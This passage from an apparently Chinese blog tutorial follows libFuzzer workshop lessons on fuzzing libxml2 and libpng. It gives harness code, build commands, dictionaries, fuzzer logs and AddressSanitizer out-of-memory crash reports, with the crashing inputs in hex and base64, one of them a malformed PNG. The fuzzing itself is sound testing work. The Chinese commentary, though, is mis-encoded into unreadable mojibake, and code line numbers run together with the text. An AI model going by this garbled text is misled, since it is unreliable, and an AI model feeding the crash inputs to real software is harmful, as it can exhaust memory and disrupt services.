46&quot;\\x02\\x00&quot; # Uses: 32&quot;+\\x00&quot; # Uses: 37&quot;\\x00\\x00\\x00\\x00\\x00\\x00 \\x02&quot; # Uses: 42&quot;\\x00\\x0f&quot; # Uses: 37&quot;\\xff\\xff\\xff\\xff\\xff\\xff\\xff$&quot; # Uses: 49&quot;ASCII&quot; # Uses: 40&quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00&quot; # Uses: 30&quot;a\\xff:-\\xec&quot; # Uses: 27&quot;\\xff\\x1a&quot; # Uses: 30&quot;'''''''''&amp;''&quot; # Uses: 23&quot;\\x01\\x00\\x00\\x00\\x00\\x00\\x01\\x1d&quot; # Uses: 34&quot;TIOIb&quot; # Uses: 19&quot;J\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; # Uses: 15&quot;N\\x00\\x00\\x00&quot; # Uses: 10&quot;\\x01O&quot; # Uses: 8&quot;\\xff\\xff\\xff\\x02&quot; # Uses: 6&quot;HTML&quot; # Uses: 8&quot;\\x00P&quot; # Uses: 9&quot;\\xff\\xff\\xff\\x00&quot; # Uses: 9&quot;\\xff\\x06&quot; # Uses: 9&quot;\\x7f\\x96\\x98\\x00\\x00\\x00\\x00\\x00&quot; # Uses: 4&quot;^&gt;&lt;b&gt;&quot; # Uses: 5&quot;\\x01\\x0a&quot; # Uses: 5&quot;\\x13\\x00&quot; # Uses: 1###### End of recommended dictionary. ######Done 479244 runs in 61 second(s)stat::number_of_executed_units: 479244stat::average_exec_per_sec: 7856stat::new_units_added: 5007stat::slowest_unit_time_sec: 0stat::peak_rss_mb: 467 å¯ä»¥çœ‹åˆ°æœ€åè¿˜ç»™å‡ºäº†Recommended dictionaryï¼Œå¯ä»¥æ›´æ–°åˆ°æˆ‘ä»¬çš„.dictä¸­ã€‚stat::new_units_added: 4709è¯´æ˜æœ€ç»ˆæ¢æµ‹åˆ°äº†5007ä¸ªä»£ç å•å…ƒã€‚ä¸ä½¿ç”¨å­—å…¸çš„è¯ï¼š 123456Done 402774 runs in 61 second(s)stat::number_of_executed_units: 402774stat::average_exec_per_sec: 6602stat::new_units_added: 3761stat::slowest_unit_time_sec: 0stat::peak_rss_mb: 453 å¯ä»¥çœ‹åˆ°ä½¿ç”¨å­—å…¸æ•ˆç‡ç¡®å®æé«˜ä¸å°‘ã€‚ æ­¤å¤–ï¼Œå½“æˆ‘ä»¬é•¿æ—¶é—´fuzzæ—¶ï¼Œä¼šäº§ç”Ÿå’Œç¼–è¯‘å‡ºå¾ˆå¤šæ ·æœ¬ï¼Œè¿™äº›æ ·æœ¬å­˜æ”¾åœ¨è¯­æ–™åº“corpusä¸­ï¼Œä¾‹å¦‚ä¸Šé¢å°±äº§ç”Ÿäº†âœ 08 git:(master) âœ— ls -lR| grep &quot;^-&quot; | wc -l 7217 7217ä¸ªæ ·æœ¬ï¼Œå…¶ä¸­å¾ˆå¤šæ˜¯é‡å¤çš„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹æ³•è¿›è¡Œç²¾ç®€(ä½¿ç”¨-merge=1æ ‡å¿—)ï¼š 123456789101112131415161718192021222324252627282930313233mkdir corpus1_mincorpus1_min: ç²¾ç®€åçš„æ ·æœ¬é›†å­˜æ”¾çš„ä½ç½®corpus1: åŸå§‹æ ·æœ¬é›†å­˜æ”¾çš„ä½ç½®âœ 08 git:(master) âœ— ./libxml2-v2.9.2-fsanitize_fuzzer1 -merge=1 corpus1_min corpus1INFO: Seed: 1264856731INFO: Loaded 1 modules (53343 inline 8-bit counters): 53343 [0xd27740, 0xd3479f), INFO: Loaded 1 PC tables (53343 PCs): 53343 [0x9b3650,0xa83c40), MERGE-OUTER: 2724 files, 0 in the initial corpusMERGE-OUTER: attempt 1INFO: Seed: 1264900516INFO: Loaded 1 modules (53343 inline 8-bit counters): 53343 [0xd27740, 0xd3479f), INFO: Loaded 1 PC tables (53343 PCs): 53343 [0x9b3650,0xa83c40), INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 1048576 bytesMERGE-INNER: using the control file '/tmp/libFuzzerTemp.8187.txt'MERGE-INNER: 2724 total files; 0 processed earlier; will process 2724 files now#1 pulse cov: 464 exec/s: 0 rss: 32Mb#2 pulse cov: 470 exec/s: 0 rss: 33Mb#4 pulse cov: 502 exec/s: 0 rss: 33Mb#8 pulse cov: 522 exec/s: 0 rss: 34Mb#16 pulse cov: 533 exec/s: 0 rss: 34Mb#32 pulse cov: 681 exec/s: 0 rss: 35Mb#64 pulse cov: 756 exec/s: 0 rss: 36Mb#128 pulse cov: 1077 exec/s: 0 rss: 39Mb#256 pulse cov: 1247 exec/s: 0 rss: 45Mb#512 pulse cov: 1553 exec/s: 0 rss: 55Mb#1024 pulse cov: 2166 exec/s: 0 rss: 77Mb#2048 pulse cov: 2550 exec/s: 2048 rss: 120Mb#2724 DONE cov: 2666 exec/s: 2724 rss: 155MbMERGE-OUTER: succesfull in 1 attempt(s)MERGE-OUTER: the control file has 287194 bytesMERGE-OUTER: consumed 0Mb (38Mb rss) to parse the control fileMERGE-OUTER: 2313 new files with 8750 new features added; 2666 new coverage edges ç²¾ç®€åˆ°äº†2313ä¸ªæ ·æœ¬ã€‚ workshopè¿˜æä¾›äº†å¦ä¸€ä¸ªfuzz target: 123456789101112131415161718192021222324252627282930313233âœ 08 git:(master) âœ— cat xml_compile_regexp_fuzzer.cc // Copyright 2016 The Chromium Authors. All rights reserved.// Use of this source code is governed by a BSD-style license that can be// found in the LICENSE file.#include &lt;stddef.h&gt;#include &lt;stdint.h&gt;#include &lt;algorithm&gt;#include &lt;string&gt;#include &lt;vector&gt;#include &quot;libxml/parser.h&quot;#include &quot;libxml/tree.h&quot;#include &quot;libxml/xmlversion.h&quot;void ignore (void * ctx, const char * msg, ...) { // Error handler to avoid spam of error messages from libxml parser.}// Entry point for LibFuzzer.extern &quot;C&quot; int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) { xmlSetGenericErrorFunc(NULL, &amp;ignore); std::vector&lt;uint8_t&gt; buffer(size + 1, 0); std::copy(data, data + size, buffer.data()); xmlRegexpPtr x = xmlRegexpCompile(buffer.data()); if (x) xmlRegFreeRegexp(x); return 0;} ä¸ä¹‹å‰çš„ä¸åŒï¼Œå°†è¾“å…¥çš„æ•°æ®copyåˆ°bufferä¸­ï¼Œå†äº¤ç»™xmlRegexpCompileå¤„ç†ã€‚ç¼–è¯‘è¿è¡Œå¦‚ä¸‹: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152âœ 08 git:(master) âœ— clang++ -O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link -fsanitize-address-use-after-scope -std=c++11 xml_compile_regexp_fuzzer.cc -I libxml2/include libxml2/.libs/libxml2.a -fsanitize=fuzzer -lz -o libxml2-v2.9.2-fsanitize_fuzzer1 âœ 08 git:(master) âœ— ./libxml2-v2.9.2-fsanitize_fuzzer1 -dict=./xml.dictDictionary: 60 entriesINFO: Seed: 2400921417INFO: Loaded 1 modules (53352 inline 8-bit counters): 53352 [0xd27700, 0xd34768), INFO: Loaded 1 PC tables (53352 PCs): 53352 [0x9b36f0,0xa83d70), INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 4096 bytesINFO: A corpus is not provided, starting from an empty corpus#2 INITED cov: 114 ft: 115 corp: 1/1b exec/s: 0 rss: 30Mb NEW_FUNC[1/5]: 0x551cf0 in ignore(void*, char const*, ...) /home/admin/libfuzzer-workshop/lessons/08/xml_compile_regexp_fuzzer.cc:16 NEW_FUNC[2/5]: 0x552d00 in __xmlRaiseError /home/admin/libfuzzer-workshop/lessons/08/libxml2/error.c:461#6 NEW cov: 150 ft: 169 corp: 2/2b lim: 4 exec/s: 0 rss: 31Mb L: 1/1 MS: 3 ShuffleBytes-ShuffleBytes-ChangeByte-#10 NEW cov: 155 ft: 223 corp: 3/4b lim: 4 exec/s: 0 rss: 31Mb L: 2/2 MS: 4 ChangeBit-ShuffleBytes-ShuffleBytes-InsertByte-#12 NEW cov: 156 ft: 277 corp: 4/8b lim: 4 exec/s: 0 rss: 31Mb L: 4/4 MS: 2 ShuffleBytes-CopyPart-#13 NEW cov: 161 ft: 282 corp: 5/12b lim: 4 exec/s: 0 rss: 31Mb L: 4/4 MS: 1 CrossOver-#20 NEW cov: 175 ft: 302 corp: 6/14b lim: 4 exec/s: 0 rss: 31Mb L: 2/4 MS: 2 ChangeByte-ChangeBinInt-#24 NEW cov: 177 ft: 305 corp: 7/16b lim: 4 exec/s: 0 rss: 31Mb L: 2/4 MS: 4 EraseBytes-ChangeBinInt-ChangeBit-InsertByte- NEW_FUNC[1/1]: 0x604f00 in xmlFAReduceEpsilonTransitions /home/admin/libfuzzer-workshop/lessons/08/libxml2/xmlregexp.c:1777#28 NEW cov: 206 ft: 336 corp: 8/19b lim: 4 exec/s: 0 rss: 31Mb L: 3/4 MS: 4 ShuffleBytes-ChangeByte-ChangeBit-CMP- DE: &quot;\\x01?&quot;-#32 NEW cov: 209 ft: 343 corp: 9/21b lim: 4 exec/s: 0 rss: 31Mb L: 2/4 MS: 4 ManualDict-ShuffleBytes-ShuffleBytes-ChangeBit- DE: &quot;&lt;!&quot;-#38 NEW cov: 210 ft: 344 corp: 10/25b lim: 4 exec/s: 0 rss: 31Mb L: 4/4 MS: 1 ChangeByte-#45 NEW cov: 210 ft: 347 corp: 11/29b lim: 4 exec/s: 0 rss: 31Mb L: 4/4 MS: 2 CopyPart-ChangeByte-#47 NEW cov: 211 ft: 366 corp: 12/33b lim: 4 exec/s: 0 rss: 31Mb L: 4/4 MS: 2 CopyPart-ChangeBinInt-#50 NEW cov: 211 ft: 367 corp: 13/37b lim: 4 exec/s: 0 rss: 31Mb L: 4/4 MS: 3 ChangeBinInt-CopyPart-ChangeBinInt-#57 NEW cov: 211 ft: 388 corp: 14/40b lim: 4 exec/s: 0 rss: 31Mb L: 3/4 MS: 2 ManualDict-CrossOver- DE: &quot;\\&quot;\\&quot;&quot;- NEW_FUNC[1/1]: 0x606d20 in xmlFARecurseDeterminism /home/admin/libfuzzer-workshop/lessons/08/libxml2/xmlregexp.c:2589#64 NEW cov: 233 ft: 421 corp: 15/43b lim: 4 exec/s: 0 rss: 31Mb L: 3/4 MS: 2 ChangeBit-PersAutoDict- DE: &quot;\\x01?&quot;-#66 NEW cov: 235 ft: 426 corp: 16/47b lim: 4 exec/s: 0 rss: 31Mb L: 4/4 MS: 2 EraseBytes-PersAutoDict- DE: &quot;\\x01?&quot;-#68 REDUCE cov: 235 ft: 426 corp: 16/46b lim: 4 exec/s: 0 rss: 31Mb L: 3/4 MS: 2 ChangeBit-EraseBytes-#72 NEW cov: 236 ft: 427 corp: 17/50b lim: 4 exec/s: 0 rss: 31Mb L: 4/4 MS: 4 ShuffleBytes-PersAutoDict-ShuffleBytes-ShuffleBytes- DE: &quot;\\x01?&quot;-#86 REDUCE cov: 236 ft: 427 corp: 17/48b lim: 4 exec/s: 0 rss: 31Mb L: 2/4 MS: 4 ChangeByte-ChangeBinInt-CopyPart-EraseBytes-#92 NEW cov: 237 ft: 431 corp: 18/49b lim: 4 exec/s: 0 rss: 31Mb L: 1/4 MS: 1 EraseBytes-#103 NEW cov: 237 ft: 433 corp: 19/53b lim: 4 exec/s: 0 rss: 31Mb L: 4/4 MS: 1 CopyPart-#104 REDUCE cov: 237 ft: 433 corp: 19/50b lim: 4 exec/s: 0 rss: 31Mb L: 1/4 MS: 1 CrossOver- NEW_FUNC[1/1]: 0x600e30 in xmlFAParseCharClassEsc /home/admin/libfuzzer-workshop/lessons/08/libxml2/xmlregexp.c:4843#115 NEW cov: 243 ft: 439 corp: 20/54b lim: 4 exec/s: 0 rss: 31Mb L: 4/4 MS: 1 ChangeByte-#118 NEW cov: 246 ft: 447 corp: 21/58b lim: 4 exec/s: 0 rss: 31Mb L: 4/4 MS: 3 CrossOver-PersAutoDict-ChangeBinInt- DE: &quot;\\&quot;\\&quot;&quot;-#134 REDUCE cov: 249 ft: 457 corp: 22/62b lim: 4 exec/s: 0 rss: 31Mb L: 4/4 MS: 1 CrossOver-#137 REDUCE cov: 249 ft: 460 corp: 23/64b lim: 4 exec/s: 0 rss: 31Mb L: 2/4 MS: 3 InsertByte-EraseBytes-PersAutoDict- DE: &quot;\\x01?&quot;-#145 NEW cov: 250 ft: 461 corp: 24/66b lim: 4 exec/s: 0 rss: 31Mb L: 2/4 MS: 3 CopyPart-EraseBytes-ChangeBit-#153 NEW cov: 250 ft: 507 corp: 25/69b lim: 4 exec/s: 0 rss: 31Mb L: 3/4 MS: 3 CrossOver-ShuffleBytes-CopyPart- NEW_FUNC[1/1]: 0x600890 in xmlFAParseCharGroup /home/admin/libfuzzer-workshop/lessons/08/libxml2/xmlregexp.c:5100#165 NEW cov: 254 ft: 511 corp: 26/71b lim: 4 exec/s: 0 rss: 32Mb L: 2/4 MS: 2 InsertByte-ManualDict- DE: &quot;[]&quot;-===================================================================8434==ERROR: AddressSanitizer: allocator is out of memory trying to allocate 0x18 bytes==8434==ERROR: AddressSanitizer failed to allocate 0x2000 (8192) bytes of InternalMmapVector (error code: 12)ERROR: Failed to mmapMS: 4 ChangeBit-EraseBytes-PersAutoDict-ChangeBit- DE: &quot;[]&quot;-; base unit: 85f707600c5524d8497fd94066e422258633e02f0x7f,0x5b,0xdd,\\x7f[\\xddartifact_prefix='./'; Test unit written to ./crash-dffb37701985bd6539dcbcfe2a04661627b040ffBase64: f1vd å¥½å®¶ä¼™ï¼Œè¿™ä¸ªharnesså‡ ç§’æŠ›å‡ºäº†crashï¼Œè¯´æ˜å¯¹äºçš„å…¥å£å‡½æ•°çš„é€‰æ‹©è‡³å…³é‡è¦ã€‚ä½†è¿™æ¬¡çš„å¼‚å¸¸æœ‰ç‚¹å¥‡æ€ª==8434==ERROR: AddressSanitizer: allocator is out of memory trying to allocate 0x18 bytesæè¿°è¯´ç”³è¯·è¶…å‡ºäº†å†…å­˜ï¼Œä¹Ÿæ²¡æœ‰SUMMARYå¯¹æ¼æ´è¿›è¡Œå®šä½ã€‚å› æ­¤æˆ‘ä»¬åº”è¯¥æ„è¯†åˆ°é—®é¢˜æ˜¯å‡ºåœ¨äº†harnessä¸Šï¼Œç”±äºåœ¨xml_compile_regexp_fuzzer.ccä¸­ä½¿ç”¨std::vector&lt;uint8_t&gt; buffer(size + 1, 0);å¯¹dataè¿›è¡Œè½¬å‚¨ï¼Œåœ¨æ ·ä¾‹ä¸æ–­å¢åŠ çš„è¿‡ç¨‹ä¸­vectorè¶…å‡ºäº†æ‰©å®¹çš„å†…å­˜é™åˆ¶ï¼Œä»è€ŒæŠ›å‡ºäº†crashï¼Œè¿™å¹¶ä¸æ˜¯æµ‹è¯•å‡½æ•°xmlRegexpCompileå‡½æ•°çš„é—®é¢˜ã€‚åœ¨å¦ä¸€ä¸ªå¯¹xmlReadMemoryçš„fuzzè¿˜åœ¨è¿›è¡Œï¼Œå­¦é•¿è¯´å®ƒfuzzè¿™ä¸ªå‡½æ•°èŠ±äº†åå‡ ä¸ªå°æ—¶æ‰å‡ºcrashã€‚ lesson 09(the importance of seed corpus)è¿™æ¬¡æˆ‘ä»¬çš„ç›®æ ‡ä¸ºå¼€æºåº“libpngï¼Œé¦–å…ˆå¯¹æºç è¿›è¡Œç¼–è¯‘ 12345678910111213141516171819202122tar xzf libpng.tgzcd libpng# Disable logging via library build configuration control.cat scripts/pnglibconf.dfa | sed -e &quot;s/option STDIO/option STDIO disabled/&quot; \\&gt; scripts/pnglibconf.dfa.tempmv scripts/pnglibconf.dfa.temp scripts/pnglibconf.dfa #è¿™é‡ŒæŠŠé”™è¯¯æ¶ˆæ¯ç¦ç”¨# build the library.autoreconf -f -i#1export FUZZ_CXXFLAGS=&quot;-O2 -fno-omit-frame-pointer -g -fsanitize=address \\ -fsanitize-coverage=trace-pc-guard,trace-cmp,trace-gep,trace-div&quot;./configure CC=&quot;clang&quot; CFLAGS=&quot;$FUZZ_CXXFLAGS&quot;make -j2 #2export FUZZ_CXXFLAGS=&quot;-O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link&quot;CXX=&quot;clang++ $FUZZ_CXXFLAGS&quot; CC=&quot;clang $FUZZ_CXXFLAGS&quot; \\ CCLD=&quot;clang++ $FUZZ_CXXFLAGS&quot; ./configuremake -j$(nproc) workshopç»™å‡ºçš„æ˜¯#1çš„ç¼–è¯‘ç­–ç•¥ï¼Œæ²¡æœ‰å¯ç”¨é‡‡æ ·åˆ†æå™¨ï¼Œè€Œä¸” -fsanitize-coverage=trace-pc-guardé€‚ç”¨åœ¨older versionçš„libfuzzerã€‚å› æ­¤æˆ‘ç”¨çš„æ˜¯#2çš„ç¼–è¯‘ç­–ç•¥ï¼Œä¸Šä¸€ä¸ªlessonè¯æ˜è¿™æ ·çš„ç¼–è¯‘æ’æ¡©èƒ½æœ‰æ•ˆæé«˜fuzzçš„æ•ˆç‡ã€‚æä¾›çš„harnessï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129// Copyright 2015 The Chromium Authors. All rights reserved.// Use of this source code is governed by a BSD-style license that can be// found in the LICENSE file.#include &lt;stddef.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;#include &lt;vector&gt;#define PNG_INTERNAL#include &quot;png.h&quot;struct BufState { const uint8_t* data; size_t bytes_left;};struct PngObjectHandler { png_infop info_ptr = nullptr; png_structp png_ptr = nullptr; png_voidp row_ptr = nullptr; BufState* buf_state = nullptr; ~PngObjectHandler() { if (row_ptr &amp;&amp; png_ptr) { png_free(png_ptr, row_ptr); } if (png_ptr &amp;&amp; info_ptr) { png_destroy_read_struct(&amp;png_ptr, &amp;info_ptr, nullptr); } delete buf_state; }};void user_read_data(png_structp png_ptr, png_bytep data, png_size_t length) { BufState* buf_state = static_cast&lt;BufState*&gt;(png_get_io_ptr(png_ptr)); if (length &gt; buf_state-&gt;bytes_left) { png_error(png_ptr, &quot;read error&quot;); } memcpy(data, buf_state-&gt;data, length); buf_state-&gt;bytes_left -= length; buf_state-&gt;data += length;}static const int kPngHeaderSize = 8;// Entry point for LibFuzzer.// Roughly follows the libpng book example:// http://www.libpng.org/pub/png/book/chapter13.htmlextern &quot;C&quot; int LLVMFuzzerTestOneInput(const uint8_t* data, size_t size) { if (size &lt; kPngHeaderSize) { return 0; } std::vector&lt;unsigned char&gt; v(data, data + size); if (png_sig_cmp(v.data(), 0, kPngHeaderSize)) { // not a PNG. return 0; } PngObjectHandler png_handler; png_handler.png_ptr = png_create_read_struct (PNG_LIBPNG_VER_STRING, nullptr, nullptr, nullptr); if (!png_handler.png_ptr) { return 0; } png_set_user_limits(png_handler.png_ptr, 2048, 2048); png_set_crc_action(png_handler.png_ptr, PNG_CRC_QUIET_USE, PNG_CRC_QUIET_USE); png_handler.info_ptr = png_create_info_struct(png_handler.png_ptr); if (!png_handler.info_ptr) { return 0; } // Setting up reading from buffer. png_handler.buf_state = new BufState(); png_handler.buf_state-&gt;data = data + kPngHeaderSize; png_handler.buf_state-&gt;bytes_left = size - kPngHeaderSize; png_set_read_fn(png_handler.png_ptr, png_handler.buf_state, user_read_data); png_set_sig_bytes(png_handler.png_ptr, kPngHeaderSize); // libpng error handling. if (setjmp(png_jmpbuf(png_handler.png_ptr))) { return 0; } // Reading. png_read_info(png_handler.png_ptr, png_handler.info_ptr); png_handler.row_ptr = png_malloc( png_handler.png_ptr, png_get_rowbytes(png_handler.png_ptr, png_handler.info_ptr)); // reset error handler to put png_deleter into scope. if (setjmp(png_jmpbuf(png_handler.png_ptr))) { return 0; } png_uint_32 width, height; int bit_depth, color_type, interlace_type, compression_type; int filter_type; if (!png_get_IHDR(png_handler.png_ptr, png_handler.info_ptr, &amp;width, &amp;height, &amp;bit_depth, &amp;color_type, &amp;interlace_type, &amp;compression_type, &amp;filter_type)) { return 0; } // This is going to be too slow. if (width &amp;&amp; height &gt; 100000000 / width) return 0; if (width &gt; 2048 || height &gt; 2048) return 0; int passes = png_set_interlace_handling(png_handler.png_ptr); png_start_read_image(png_handler.png_ptr); for (int pass = 0; pass &lt; passes; ++pass) { for (png_uint_32 y = 0; y &lt; height; ++y) { png_read_row(png_handler.png_ptr, static_cast&lt;png_bytep&gt;(png_handler.row_ptr), NULL); } } return 0;} å¯¹äºæ¨¡ç³Šæµ‹è¯•æ¥è¯´ï¼Œèƒ½å¦å†™å‡ºåˆé€‚çš„harnesså…³ä¹ç€fuzzæœ€åçš„ç»“æœï¼Œæˆ‘ä»¬é€šå¸¸é€‰æ‹©æ¶‰åŠå†…å­˜ç®¡ç†ï¼Œæ•°æ®å¤„ç†ç­‰æ–¹é¢çš„å‡½æ•°ä½œä¸ºæˆ‘ä»¬çš„æ¥å£å‡½æ•°å»fuzzã€‚è¿™é‡Œç»™å‡ºçš„harnessä¸­æˆ‘ä»¬æ¯”è¾ƒå®¹æ˜“çœ‹åˆ°å®ƒä¼šé¦–å…ˆå»é€šè¿‡png_sig_cmpå‡½æ•°å»åˆ¤æ–­è¾“å…¥çš„dataæ˜¯å¦ç¬¦åˆpngçš„æ ¼å¼ï¼Œç¬¦åˆæ‰èƒ½è¿›å…¥åˆ°åé¢çš„é€»è¾‘ä¸­ï¼Œè¿™ä¸€æ–¹é¢æ˜¯ç¡®ä¿dataçš„æœ‰æ•ˆæ€§ï¼ŒåŒæ—¶ä¹Ÿæé«˜äº†æ•°æ®å˜å¼‚çš„é€Ÿç‡ã€‚ç”±äºè¦æ±‚è¾“å…¥æ•°æ®ä¸ºpngçš„æ ¼å¼ï¼Œé‚£è‡ªç„¶æƒ³åˆ°ä½¿ç”¨å­—å…¸å»æ‹¼æ¥å…³é”®å­—ã€‚è¿™æ ·çš„æƒ³æ³•æ˜¯æ­£ç¡®çš„ï¼Œä¸‹é¢æ¯”è¾ƒä¸€ä¸‹ä¸¤è€…çš„å·®å¼‚ï¼šå…ˆç¼–è¯‘:clang++ -O2 -fno-omit-frame-pointer -gline-tables-only -fsanitize=address,fuzzer-no-link -std=c++11 libpng_read_fuzzer.cc -I libpng libpng/.libs/libpng16.a -fsanitize=fuzzer -lz -o libpng_read_fuzzerä½¿ç”¨çš„ä¹Ÿæ˜¯AFLç»™å‡ºçš„png.dict: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253# Copyright 2016 Google Inc.## Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);# you may not use this file except in compliance with the License.# You may obtain a copy of the License at## http://www.apache.org/licenses/LICENSE-2.0## Unless required by applicable law or agreed to in writing, software# distributed under the License is distributed on an &quot;AS IS&quot; BASIS,# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.# See the License for the specific language governing permissions and# limitations under the License.################################################################################### AFL dictionary for PNG images# -----------------------------## Just the basic, standard-originating sections; does not include vendor# extensions.## Created by Michal Zalewski &lt;lcamtuf@google.com&gt;#header_png=&quot;\\x89PNG\\x0d\\x0a\\x1a\\x0a&quot;section_IDAT=&quot;IDAT&quot;section_IEND=&quot;IEND&quot;section_IHDR=&quot;IHDR&quot;section_PLTE=&quot;PLTE&quot;section_bKGD=&quot;bKGD&quot;section_cHRM=&quot;cHRM&quot;section_fRAc=&quot;fRAc&quot;section_gAMA=&quot;gAMA&quot;section_gIFg=&quot;gIFg&quot;section_gIFt=&quot;gIFt&quot;section_gIFx=&quot;gIFx&quot;section_hIST=&quot;hIST&quot;section_iCCP=&quot;iCCP&quot;section_iTXt=&quot;iTXt&quot;section_oFFs=&quot;oFFs&quot;section_pCAL=&quot;pCAL&quot;section_pHYs=&quot;pHYs&quot;section_sBIT=&quot;sBIT&quot;section_sCAL=&quot;sCAL&quot;section_sPLT=&quot;sPLT&quot;section_sRGB=&quot;sRGB&quot;section_sTER=&quot;sTER&quot;section_tEXt=&quot;tEXt&quot;section_tIME=&quot;tIME&quot;section_tRNS=&quot;tRNS&quot;section_zTXt=&quot;zTXt&quot;# å…ˆä¸ä½¿ç”¨å­—å…¸ï¼š 1234567./libpng_read_fuzzer -max_total_time=60 -print_final_stats=1Done 5454409 runs in 61 second(s)stat::number_of_executed_units: 5454409stat::average_exec_per_sec: 89416stat::new_units_added: 512stat::slowest_unit_time_sec: 0stat::peak_rss_mb: 822 æ¢æµ‹åˆ°äº†512ä¸ªä»£ç å•å…ƒä¹‹åä½¿ç”¨å­—å…¸ï¼š 1234567891011121314151617181920212223242526272829303132./libpng_read_fuzzer -max_total_time=60 -print_final_stats=1 -dict=./png.dict#2849333 REDUCE cov: 287 ft: 511 corp: 111/19Kb lim: 4096 exec/s: 105530 rss: 682Mb L: 43/3088 MS: 1 EraseBytes-#2871709 REDUCE cov: 291 ft: 515 corp: 112/19Kb lim: 4096 exec/s: 106359 rss: 682Mb L: 47/3088 MS: 1 ManualDict- DE: &quot;bKGD&quot;-#2883416 NEW cov: 293 ft: 520 corp: 113/19Kb lim: 4096 exec/s: 106793 rss: 682Mb L: 48/3088 MS: 2 PersAutoDict-EraseBytes- DE: &quot;sPLT&quot;-===================================================================26551==ERROR: AddressSanitizer: allocator is out of memory trying to allocate 0x62474b42 bytes #0 0x51f69d in malloc /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:145:3 #1 0x5a98a3 in png_read_buffer /home/admin/libfuzzer-workshop/lessons/09/libpng/pngrutil.c:310:16 #2 0x5a98a3 in png_handle_sPLT /home/admin/libfuzzer-workshop/lessons/09/libpng/pngrutil.c:1683:13 #3 0x571b3c in png_read_info /home/admin/libfuzzer-workshop/lessons/09/libpng/pngread.c:225:10 #4 0x551b3a in LLVMFuzzerTestOneInput /home/admin/libfuzzer-workshop/lessons/09/libpng_read_fuzzer.cc:91:3 #5 0x459a21 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:553:15 #6 0x459265 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool*) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:469:3 #7 0x45b507 in fuzzer::Fuzzer::MutateAndTestOne() /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:695:19 #8 0x45c225 in fuzzer::Fuzzer::Loop(std::Fuzzer::vector&lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator&lt;fuzzer::SizedFile&gt; &gt;&amp;) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerLoop.cpp:831:5 #9 0x449fe8 in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerDriver.cpp:825:6 #10 0x473452 in main /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/fuzzer/FuzzerMain.cpp:19:10 #11 0x7f5d84c2fbf6 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21bf6)==26551==HINT: if you don't care about these errors you may set allocator_may_return_null=1SUMMARY: AddressSanitizer: out-of-memory /local/mnt/workspace/bcain_clang_bcain-ubuntu_23113/llvm/utils/release/final/llvm.src/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:145:3 in malloc==26551==ABORTINGMS: 1 ShuffleBytes-; base unit: 1c223175724dec61e3adf94affb1cceec27d30ae0x89,0x50,0x4e,0x47,0xd,0xa,0x1a,0xa,0x0,0x0,0x0,0xd,0x49,0x48,0x44,0x52,0x0,0x0,0x0,0x10,0x0,0x0,0x0,0x63,0x1,0x0,0x0,0x0,0x0,0x4,0x0,0x41,0x41,0x62,0x47,0x4b,0x41,0x73,0x50,0x4c,0x54,0x44,0x41,0x41,0x41,0x41,0x41,0xb9,\\x89PNG\\x0d\\x0a\\x1a\\x0a\\x00\\x00\\x00\\x0dIHDR\\x00\\x00\\x00\\x10\\x00\\x00\\x00c\\x01\\x00\\x00\\x00\\x00\\x04\\x00AAbGKAsPLTDAAAAA\\xb9artifact_prefix='./'; Test unit written to ./crash-ac5ad67d43ac829fd5148d6930a33c17c2ac7143Base64: iVBORw0KGgoAAAANSUhEUgAAABAAAABjAQAAAAAEAEFBYkdLQXNQTFREQUFBQUG5stat::number_of_executed_units: 2888597stat::average_exec_per_sec: 103164stat::new_units_added: 533stat::slowest_unit_time_sec: 0stat::peak_rss_mb: 682 å•Šè¿™ï¼Œç›´æ¥å‡ºcrash,æœ‰ç‚¹ä¸œè¥¿ã€‚è¿™ä¹Ÿå†æ¬¡è¯´æ˜äº†å¥½çš„å­—å…¸ä½¿å¾—æˆ‘ä»¬fuzzæ—¶çš„è¾“å…¥æ•°æ®æ›´å…·æœ‰é’ˆå¯¹æ€§ï¼Œå½“ç„¶ä¹Ÿæé«˜äº†è§¦å‘æ›´å¤šä»£ç 